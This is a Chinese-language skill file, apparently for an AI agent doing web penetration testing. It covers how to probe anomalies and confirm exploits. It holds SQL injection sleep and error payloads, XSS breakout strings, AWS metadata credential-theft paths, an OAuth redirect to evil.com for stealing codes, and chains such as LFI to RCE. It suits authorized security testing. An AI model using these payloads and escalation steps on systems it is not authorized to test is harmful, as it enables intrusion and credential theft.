---
name: investigate
description: 异常深调查——定可利用性、链发现、升级影响
---

# 调查异常

你发现可疑之物——auto_probe 的 35 分、注入的 500 错、细微 length 差。任务：定此可利用否、多严重？

## SMART MOVE —— 首调

```
1. plan = smart_request_triage(index=<the_suspicious_one>)
2. read plan["attack_plan"][0]["suggested_call"] — dispatch it directly
3. if verdict CONFIRMED → assess_finding → save_finding (Rule 10)
4. if SUSPECTED → follow verify-finding.md ladder for that class
5. if FAILED → annotate GRAY + move on (don't burn tokens chasing noise)
```

完整版：`smart-move-captured-something-weird.md`。

## 何时用此 skill

- `auto_probe` 返发现 score < 50（可疑但未确认）
- `fuzz_parameter` 显异常（status 变、length 差、timing 峰）
- 手测现意外行为
- 需把 LOW/MEDIUM 发现升级演示真实影响
- 想链多发现

## Phase 1：理解行为

造任何 payload 前，先理解应用对输入做**什么**。

### Step 1：建基线行为

```python
# 发 NORMAL 请求，记一切
session_request(session, "GET", path, extract={...})
# 记：精确 status、精确 length、精确 timing、关键响应内容
```

### Step 2：探输入处理

发这些诊断输入对比基线：

| 输入 | 告诉你什么 |
|---|---|
| 空串 `""` | 应用需此参数否？ |
| 极长串（5000 字符） | 缓冲处理、截断行为 |
| 特殊字符 `'"\<>{}()` | 哪些字符被滤 / 编码 / 反射？ |
| Unicode `%C0%AE` `%EF%BC%8F` | 应用归一化 unicode 否？ |
| Null 字节 `%00` | 在 null 截断否？ |
| 数字边界 `0`、`-1`、`999999999` | 整数处理、IDOR 潜力 |
| 类型混乱 `[]`、`{}`、`true` | JSON 解析行为 |

### Step 3：映射反射上下文

输入出现在响应中则定**何处**：

```python
# 发唯一 marker 并在响应中找之
session_request(session, "GET", f"{path}?{param}=XYZZY123PROBE")
# 然后 get_request_detail with full_body=True 并搜 XYZZY123PROBE
```

**上下文定一切：**
- HTML body 内 → 测 HTML 注入（`<img>`、`<svg>`）
- HTML 属性内 → 测属性突围（`" onmouseover=`）
- JavaScript 字符串内 → 测字符串突围（`'-alert(1)-'`）
- JavaScript 模板字面量内 → 测 `${expression}`
- URL/href 内 → 测 `javascript:` 协议
- JSON 响应内 → 测 JSON 注入
- HTTP header 内 → 测 CRLF 注入
- 不反射 → 试盲技术（timing、Collaborator）

### Step 4：映射过滤器

若特殊字符被滤，精确定滤器：

```python
# 单独测每字符
fuzz_parameter(index, parameter="param", payloads=[
    "<", ">", "'", '"', "/", "\\", "{", "}", "(", ")", ";", "|", "&",
    "%3C", "%3E", "%27", "%22",  # URL 编码版
    "&#60;", "&#62;",             # HTML 实体版
], grep_match=["<", ">", "'", '"', "{", "}"])
```

建过滤器图：
- `<` 拦，`%3C` 拦，`&#60;` 允 → HTML 实体绕可
- `<script>` 拦，`<img>` 允 → 基于 tag 绕
- `alert` 拦，`confirm` 允 → 函数名绕
- 单引号拦，反引号允 → 模板字面量注入

## Phase 2：深化调查

按 Phase 1 揭示选合适深挖：

### 若输入反射（潜在 XSS / 注入）

1. **用上面反射检查定精确上下文**
2. **试上下文合适突围：**
   ```python
   get_payloads(category="xss", context="attribute")  # 属性中
   get_payloads(category="xss", context="javascript")  # JS 字符串中
   get_payloads(category="xss", context="waf_bypass")  # 检测到 WAF
   ```
3. **测编码变体：**
   ```python
   decode_encode(payload, "url_encode")
   decode_encode(payload, "double_url_encode")
   decode_encode(payload, "html_encode")
   ```
4. **用定向 payload fuzz：**
   ```python
   fuzz_parameter(index, parameter=param, payloads=targeted_list,
                  grep_match=["alert", "onerror", "onload"])
   ```

### 若 status 变（潜在 SQLi/CMDi/LFI）

1. **定是注入还是仅输入校验：**
   ```python
   # 比错响应——按 payload 不同否？
   resend_with_modification(index, modify_path=f"{path}?{param}='")      # 单引号
   resend_with_modification(index, modify_path=f"{path}?{param}=''")     # 双引号（合法 SQL）
   resend_with_modification(index, modify_path=f"{path}?{param}=1 AND 1=1")  # 真条件
   resend_with_modification(index, modify_path=f"{path}?{param}=1 AND 1=2")  # 假条件
   ```
2. **真 vs 假不同：boolean-blind SQLi** —— 二分搜索抽数据
3. **两者都错：测 timing：**
   ```python
   # Time-based blind 确认
   probe_endpoint(session, method, path, param,
                  test_payloads=["1; WAITFOR DELAY '0:0:3'--", "1 AND SLEEP(3)--", "1; SELECT pg_sleep(3)--"])
   ```
4. **timing 确认：用 Collaborator 做 OOB 确认：**
   ```python
   auto_collaborator_test(index, param)
   ```

### 若 length 大变（潜在 IDOR / 数据泄露）

1. **比实际内容：**
   ```python
   compare_responses(baseline_index, anomaly_index, mode="body")
   ```
2. **diff 中找 PII 或不同用户数据**
3. **系统测多 ID：**
   ```python
   fuzz_parameter(index, parameter="id", payloads=["1","2","3","0","-1","999"],
                  grep_match=["email", "phone", "address", "password", "ssn"])
   ```
4. **跨认证验证：**
   ```python
   compare_auth_states(index, alt_cookies={"session": "other_user_cookie"})
   ```

### 若 timing 异常（潜在盲注入）

1. **排除网络 jitter——各测 3 次：**
   ```python
   # 基线 timing（3 请求）
   session_request(session, method, f"{path}?{param}=1")  # 记时
   session_request(session, method, f"{path}?{param}=1")  # 记时
   session_request(session, method, f"{path}?{param}=1")  # 记时

   # Payload timing（3 请求）
   session_request(session, method, f"{path}?{param}=1 AND SLEEP(3)--")  # 记时
   session_request(session, method, f"{path}?{param}=1 AND SLEEP(3)--")  # 记时
   session_request(session, method, f"{path}?{param}=1 AND SLEEP(3)--")  # 记时
   ```
2. **一致 3x+ 延迟 = 确认盲注入**
3. **试不同 sleep 值**（SLEEP(1)、SLEEP(5)）—— 延迟应线性缩放

## Phase 3：升级影响

演示真实世界影响时发现更值。升级：

### 从 error-based SQLi → 数据抽取
```python
# 抽数据库版本
probe_endpoint(session, method, path, param,
               test_payloads=["1 AND 1=CONVERT(int,@@version)--",
                              "1 AND ExtractValue(1,CONCAT(0x7e,version()))--"])
# 抽表名
# 抽用户凭据
```

### 从 reflected XSS → session 劫持证明
```python
# 造演示 cookie 盗窃的 payload
# 显 document.cookie 可访问（无 HttpOnly）
# 或演示 CSP 绕过若 CSP 存在
```

### 从 SSRF → 凭据盗窃
```python
test_cloud_metadata(session, parameter=param, path=path)
# 若 AWS：试 /latest/meta-data/iam/security-credentials/
# 若内部访问：试击内部服务（Redis、Elasticsearch）
```

### 从 IDOR → mass 数据暴露
```python
# 别仅显一 ID 可——显模式
test_auth_matrix(
    endpoints=[
        {"method": "GET", "path": "/api/users/1/profile"},
        {"method": "GET", "path": "/api/users/2/profile"},
        {"method": "GET", "path": "/api/users/3/profile"},
    ],
    auth_states={"victim": {"session": "attacker_session"}}
)
# 量化："攻击者可访问全 N 用户 profile"
```

### 从 open redirect → OAuth token 盗窃
```python
# 若 redirect 参数在 OAuth 流：
# redirect_uri=https://evil.com → 盗授权码
# 此升 MEDIUM open redirect 至 HIGH 账户接管
```

## Phase 4：链发现

最高价值 bug 是**链**。找这些模式：

| 发现 A | + 发现 B | = 影响 |
|---|---|---|
| Open redirect | SSRF URL 校验绕过 | 经 redirect 链访问内部服务 |
| XSS（任何） | 敏感动作 CSRF | Wormable 攻击——XSS 自动触发 CSRF |
| Info 泄露（内部 URL） | SSRF | 用泄露 URL 访问内部服务 |
| IDOR（读） | CSRF | 读受害者数据后改之 |
| LFI | Log poisoning（User-Agent 注入） | LFI → 读 access log → 经日志中注入 PHP 的 RCE |
| JWT 弱 secret | Claim 修改 | 造 admin JWT → 完全账户接管 |
| XSS | Cookie 无 HttpOnly | 经 document.cookie 外泄的 session 劫持 |
| CORS 配错 | 敏感 API 端点 | 跨源盗用户 PII |

### 如何链
```python
# 步 1：验发现 A 可
# 步 2：独立验发现 B 可
# 步 3：用 run_flow 建链：
run_flow(session, steps=[
    {"method": "GET", "path": "/redirect?url=http://internal.service",  # 发现 A：redirect
     "extract": {"internal_data": {"from": "body", "regex": "secret=([^&]+)"}}},
    {"method": "POST", "path": "/api/action",  # 发现 B：用泄露数据
     "json_body": {"secret": "{{internal_data}}"}},
])
```

## Phase 5：记录发现

利用确认后带全上下文存：

```python
save_target_intel(domain, "findings", {
    "endpoint": "GET /api/users",
    "vulnerability_type": "sqli",
    "parameter": "id",
    "status": "confirmed",
    "severity": "HIGH",
    "evidence": {
        "baseline": {"status": 200, "length": 1234, "time_ms": 120},
        "payload": "1' AND SLEEP(3)--",
        "result": {"status": 200, "length": 1234, "time_ms": 3250},
        "reproduction_rate": "3/3 attempts",
        "collaborator_proof": "DNS interaction from 10.0.0.1"
    },
    "poc_request": {"method": "GET", "path": "/api/users?id=1' AND SLEEP(3)--"},
    "impact": "Time-based blind SQL injection allows full database extraction including user credentials",
    "chain_potential": "Can be chained with IDOR on /api/users/{id} for targeted data extraction",
    "last_verified": "<timestamp>",
    "verification_failures": 0
})
```

## 决策规则

- **auto_probe score >= 50**：可能真——快验（仅 Phase 1 Step 1-2）后确认
- **score 30-49**：可疑——跑全 Phase 1-2 调查。若此目标有已存发现，**先**查 `chain-findings.md`——异常可能解锁链而非独立 bug。
- **score 10-29**：异常符已知类无链潜力时封顶 5 工具调。任一为真跑全 Phase 1：(a) 无匹配模式的未解基线 delta（length/timing/status/header 不符任何漏洞类——此为 Rule 27 要求的 unknown-unknowns），(b) 目标高价值（auth 流、支付、admin、内部 API），(c) 类似异常见 >1 端点（示系统性缺陷）。
- **score < 10**：仅在已知类下评分时跳。未评分未解行为（status 翻、header 变、pattern 目录外的 timing jitter）是 Rule 27 候选——驳回前至少查一轮。
- **任何 Collaborator 交互**：总真——立即记录
- **timing > 3x 基线（3+ 测）**：很可能真——记录并升级
- **业务逻辑异常（流程跳、状态复用、序变）**：总调查。`auto_probe` 找不到这些——需 Rule 27 要求的开放探索。
